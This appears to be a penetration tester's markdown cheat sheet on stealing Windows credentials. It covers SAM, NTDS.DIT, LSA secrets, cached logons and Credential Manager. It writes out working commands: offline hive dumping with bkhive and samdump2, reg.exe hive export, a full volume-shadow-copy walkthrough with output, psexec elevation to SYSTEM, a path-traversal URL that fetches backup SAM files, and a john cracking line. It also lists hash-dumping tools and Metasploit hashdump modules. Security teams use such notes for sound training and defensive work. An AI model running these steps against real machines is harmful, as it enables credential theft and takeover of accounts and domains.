* https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html
* https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes_16.html
* https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes_20.html
* https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes_21.html
* https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes_28.html
* https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes_29.html


# Dump Local Hashes
* The Security Accounts Manager (SAM) is a registry file in Windows NT and later versions until the most recent Windows 7. It stores users' passwords in a hashed format (in LM hash and NTLM hash). Since a hash function is one-way, this provides some measure of security for the storage of the passwords.

* Windows password hashes are located in the Windows SAM file, located on your system at C:\Windows\System32\config but is not accessible while the operating system is booted up.

* These values are also stored in the registry at HKEY_LOCAL_MACHINE\SAM, but again this area of the registry is also not accessible while the operating system is booted.


**Need to dump the hash files**

## Physical Access

* Preferred way to dump hash files:     
  Power off the machine, enter the BIOS menu at power-on time, review the boot order to allow boot from the optical drive and USB drive before local hard-disk, save the settings and reboot the system with your favourite GNU/Linux live distribution CD or USB stick

  - bkhive - dumps the syskey bootkey from a Windows system hive.
  - samdump2 - dumps Windows 2k/NT/XP/Vista password hashes.

  **Example of retrieving the SAM hashes from a Windows partition /dev/sda1:**
  ```
  # mkdir -p /mnt/sda1
  # mount /dev/sda1 /mnt/sda1
  # bkhive /mnt/sda1/Windows/System32/config/SYSTEM /tmp/saved-syskey.txt
  # samdump2 /mnt/sda1/Windows/System32/config/SAM /tmp/saved-syskey.txt > /tmp/hashes.txt
  ```

* Another option is to:  
  Copy the SYSTEM and SAM files from /mnt/sda1/Windows/System32/config to your USB stick and import them to any tool that is able to extract the SAM hashes from them: *Cain & Abel*, *creddump* and *mimikatz* are some available tools

* Sometimes you have access to older version of SAM & SYSTEM files:
```
http://192.168.31.161/%5C..%5C..%5C..%5C..%5C..%5CWindows/system32/config/RegBack/SAM.OLD
http://192.168.31.161/%5C..%5C..%5C..%5C..%5C..%5CWindows/system32/config/RegBack/SYSTEM.OLD

# samdump2 SYSTEM.OLD SAM.OLD > hash.txt
# john -wordlist (somethin)/rockyou.txt --format=NT hash.txt
```


#### Bypass login prompt
 BootRoot
  - SysRQ2
  - Kon-Boot

#### Password Reset
  Alternatively you can boot the machine with the bootdisk live CD or USB stick and use the chntpw utility to reset any Windows local user's credentials.

---

## Post-exploitation Scenario
  First step is to elevate privileges to *SYSTEM*. One way to achieve this is to use *PsExec*.
  ```
  C:\>psexec.exe -i -s cmd.exe
  ```

### Legacy Techniques
* On Windows NT and Windows 2000 systems you can use **Ntbackup** utility part of the MS-DOS subsystem.  
  Backup the system state into a file locally on the machine you have compromised, then using Ntbackup again, restore the system state stuff to a local directory without preserving the security. Once complete, you will have the SAM and SYSTEM files.
* Modern releases of Windows can also use **wbadmin** as an alternative to **Ntbackup**.

* Another solution is to use **regback.exe** part of the Windows 2000 Resource Kit Tools. This is slightly easier as it only dumps the specific files:
  ```
  C:\>regback.exe C:\backtemp\SAM machine sam
  C:\>regback.exe C:\backtemp\SYSTEM machine system
  ```

* If you cannot get **regback.exe** to work, on Windows XP and above systems use **regedit.exe** or **reg.exe**. Using **eg.exe**:
  ```
  C:\>reg.exe save HKLM\SAM sam
  The operation completed successfully
  C:\>reg.exe save HKLM\SYSTEM sys
  The operation completed successfully
  ```

* Using **regedit.exe**:
  - Execute `regedit.exe` from Start / Run prompt.
  - Open up `Computer\HKEY_LOCAL_MACHINE` and right-click the SAM section and select Export.
  - Change the `Save as` type setting to `Registry Hive Files` and save as `SAM`.
  - Same steps with `SYSTEM` hive.  


* Lastly, you can also get the SAM and SYSTEM files from `C:\Windows\repair\`. Although this directory contains outdated copies of the original `C:\Windows\System32\config\` files so it might not reflect the current users' credentials.

### Volume Shadow Copies technique

* Abusing the Volume Shadow Copies functionality in modern Windows operating systems to access locked system files like `C:\Windows\System32\config`'s SAM and SYSTEM and others.

* Need to be local admin at least.

* You can use the Volume Shadow Copy Management command line interface, **vssown**, to leverage this technique as follows.

  - List shadow copies:
    ```
    C:\>cscript vssown.vbs /list
    Microsoft (R) Windows Script Host Version 5.8
    Copyright (C) Microsoft Corporation. All rights reserved.

    SHADOW COPIES
    =============
    ```
  As expected, no shadow copies initially.

  - Verify the status of the Volume Shadow Service (VSS):
    ```
    C:\>cscript vssown.vbs /status
    Microsoft (R) Windows Script Host Version 5.8
    Copyright (C) Microsoft Corporation. All rights reserved.

    [*] Stopped

    C:\>cscript vssown.vbs /mode
    Microsoft (R) Windows Script Host Version 5.8
    Copyright (C) Microsoft Corporation. All rights reserved.

    [*] VSS service set to 'Manual' start mode.
    ```
    In this case, once we are done, we need to restore it to the initial state (Stopped).

  - Create a new shadow copy:
    ```
    C:\>cscript vssown.vbs /create c
    Microsoft (R) Windows Script Host Version 5.8
    Copyright (C) Microsoft Corporation. All rights reserved.

    [*] Attempting to create a shadow copy.
    ```

  - Verify that the shadow copy has been created:
    ```
    C:\>cscript vssown.vbs /list
    Microsoft (R) Windows Script Host Version 5.8
    Copyright (C) Microsoft Corporation. All rights reserved.

    SHADOW COPIES
    =============

    [*] ID:                  {D79A4E73-CCAB-4151-B726-55F6C5C3A853}
    [*] Client accessible:   True
    [*] Count:               1
    [*] Device object:       \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
    [*] Differnetial:        True
    [*] Exposed locally:     False
    [*] Exposed name:
    [*] Exposed remotely:    False
    [*] Hardware assisted:   False
    [*] Imported:            False
    [*] No auto release:     True
    [*] Not surfaced:        False
    [*] No writers:          True
    [*] Originating machine: LAPTOP
    [*] Persistent:          True
    [*] Plex:                False
    [*] Provider ID:         {B5946137-7B9F-4925-AF80-51ABD60B20D5}
    [*] Service machine:     LAPTOP
    [*] Set ID:              {018D7854-5A28-42AE-8B10-99138C37112F}
    [*] State:               12
    [*] Transportable:       False
    [*] Volume name:         \\?\Volume{46f5ef63-8cca-11e0-88ac-806e6f6e6963}\
    ```
    You need to take note of the Device object value for the next step and the ID for the cleanup step.

  - Pull the following files from a shadow copy:
    ```
    C:\>copy <DEVICE OBJECT>\Windows\System32\config\SYSTEM .
    C:\>copy <DEVICE OBJECT>\Windows\System32\config\SAM .

    OR

    C:\>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
    C:\>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
    ```
    You have just copied over SAM and SYSTEM files from the shadow copy to the C:\ root folder.

  - Cleanup:
    ```
    C:\>cscript vssown.vbs /delete <ID>

    OR

    C:\>cscript vssown.vbs /delete {D79A4E73-CCAB-4151-B726-55F6C5C3A853}

    Microsoft (R) Windows Script Host Version 5.8
    Copyright (C) Microsoft Corporation. All rights reserved.

    [*] Attempting to delete shadow copy with ID: {D79A4E73-CCAB-4151-B726-55F6C5C3A853}
    ```

  - Eventually, restore to original Stop status:
    ```
    C:\>cscript vssown.vbs /stop

    Microsoft (R) Windows Script Host Version 5.8
    Copyright (C) Microsoft Corporation. All rights reserved.

    [*] Signal sent to stop the VSS service.
    ```

### In-memory technique

* The concept behind in-memory dump of SAM hashes it to inject a DLL into the LSASS system process or, generally speaking, parsing  the memory for specific patterns and inspect these memory pages' content.

* The following tools are used:
  - [fgdump](http://foofus.net/goons/fizzgig/fgdump/), successor to [pwdump6](http://www.foofus.net/~fizzgig/pwdump/). fgdump works in Vista and later.
  - [pwdump7](http://www.foofus.net/~fizzgig/pwdump/) - cannot dump from domain controller
  - [gsecdump](http://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5)
  - [PWDumpX](http://packetstormsecurity.org/files/62371/PWDumpX14.zip) - does not work on 64 bit machines
  - Metasploit Post Exploitation modules post/windows/gather/smart_hashdump
  - Metasploit Post Exploitation modules post/windows/gather/hashdump
  - Metasploit Meterpreter command - hashdump

**[THIS SPREADSHEET](https://docs.google.com/spreadsheets/d/1e_QKvVml3kt6-KrlqaH6vJ6T8g4CgXmHgSjJZMoLsLA/edit#gid=0)** keeps track of which tools work under what circumstances.



---

# Dump Domain Hashes
### (on Domain Controller)

* The goal now is to dump the domain users' password hashes. These are stored, along with nearly all the information that is accessible in the Active Directory (user objects, groups, membership information, etc), in a binary file, `%SystemRoot%\ntds\NTDS.DIT`.

* This file is locked by the system. Can use the Volume Shadow Copies technique (above) to copy it along with `SYSTEM` file.

* Alternatively use `ntdsutil` snapshot facility (introduced in Windows Server 2008). It creates a snapshot of the AD DB allowing you to copy the `ntds.dit` and `SYSTEM` file. The technique is documented [here](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753609(v=ws.10)

* A number of tools can be used to extract the user's password from the hashes in the `ntds.dit` file. See the [spreadsheet](https://docs.google.com/spreadsheets/d/1e_QKvVml3kt6-KrlqaH6vJ6T8g4CgXmHgSjJZMoLsLA/edit#gid=0).

---

# Password History

* Windows stores a certain number of used passwords to test if an old password is being reused.

* Many tools can retrieve this historical passwords:

  - Cain & Abel
  - PWDummpX
  - pwhist

---

# LSA Secrets

LSA secrets is an area in the registry where Windows stores important information. This includes:
* Account passwords for services that are set to run by operating system users.
* Password used to logon to Windows if auto-logon is enabled.

* LSA secrets are stored in the hive `HKEY_LOCAL_MACHINE/Security/Policy/Secrets`.
* The parent key `HKEY_LOCAL_MACHINE/Security/Policy` contains the data necessary for accessing and decoding the secrets.

* Same as SAM, LSA secrets can be accessed by DLL injection into the `lsass.exe` process, or from the registry files.

* Safest is to copy registry files `SYSTEM` and `SECURITY`. Can use legacy registry hive copy (via `reg.exe` / `regedit.exe`) -> Cain & Abel can extract LSA secrets.

* Alternatively, numerous tools can dump LSA secrets by injecting into lsass.exe process:
  - gsecdump (most reliable)
  - lsadump2 (32 bit arch)

---

# Cached Domain Logon Information

"All previous users' logon information is cached locally so that, in the event that a domain controller is unavailable during subsequent logon attempts, they are able to log on [...]"

* Read the value of the registry property to cache domain logons at `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\CachedLogonsCount.`

* By default Windows XP and above are configured to cache 10 or more domain logon information.
* Cached domain logon information is stored in registry hives `HKEY_LOCAL_MACHINE/Security/CACHE/NL$X` with `X` being a number.
* These registry hives are accessible by Local System and tools exist to dump them.

* These hashes also available by dll injection into the `lsass.exe` process, or from registry files.
* Offline dump of the registry files `SYSTEM` and `SECURITY` (via `reg.exe`/`regedit.exe`) or volume shadow copy technique.

* Tools for extraction from these files include:
  - cain & Abel
  - [creddump](http://code.google.com/p/creddump/)
  - [Windows Password Recovery](http://www.passcape.com/windows_password_recovery)

* Tools that dump these hashes via DLL injection:
  - [cachedump](http://www.openwall.com/john/contrib/cachedump-1.2.zip)
  - [fgdump](http://www.foofus.net/~fizzgig/fgdump/)
  - [PWDumpX](http://packetstormsecurity.org/files/62371/PWDumpX14.zip)


---

# Logon Sessions

* Windows stores in memory information about every current and past successful logon - logon sessions.

* This information includes the username, the domain or workgroup name and both the LM and NT password hashes.

* Every time a legitimate user logs onto a Windows system, the Local Security Authority (LSA) stores in memory this information. This happens regardless of the logon type: interactive logon to the console or remote logon via Remote Desktop Protocol (RDP).

* Same information stored for 'RunAs' processes and services.

* Logon sessions can be dumped given an administrative shell on the target. Two techniques, code injection into `lsass.exe` and reading of LSASS memory.

* Several tools exist for this:
  - most well known is Windows Credentials Editor - `wce`

---

# Network Services Authentication Credentials

* Login information for network services is stored in db called Credentials Manager, a SSO solution since XP.

* On Windows Vista onwards the Credential Manager is available under:
  - `Control Panel\User Accounts and Family Safety\Credential Manager` or
  - from `Control Panel\User Accounts and Family Safety\User Accounts\\Manage your credentials.`

* Dump Credential Manager content with the tools:
  - [Network Password Recovery](https://www.nirsoft.net/utils/network_password_recovery.html) - not available anymore
  - Cain & Abel
  - [Password Recovery Wizard](https://www.passcape.com/network_password_recovery) $32

* Dump Protected Storage
  TOOL NOT AVAILABLE
